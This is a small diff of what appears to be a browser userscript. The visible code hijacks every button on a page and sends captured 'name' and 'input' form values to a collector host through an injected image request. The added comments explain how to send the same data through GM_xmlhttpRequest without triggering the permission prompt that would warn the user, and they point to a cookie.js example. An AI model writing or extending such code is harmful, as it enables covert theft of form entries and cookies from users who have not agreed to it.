@@ -36,6 +36,9 @@ let name = [];
         //$("body").append(`<img src="http://localhost:8000/name?" + ${name} + "/input?" + ${input}">`)
     });
     // change all the button to redirection my website
+    // this part can also change to GM_xmlhttpRequest to send ajax, but it will alert the user before grant access
+    // to avoid this, you can use the following code to send ajax
+    // To see the example of usage of GM_xmlhttpRequest, please check the cookie.js
     $("button").click(function(e){
         // prevent form submition
         e.preventDefault();
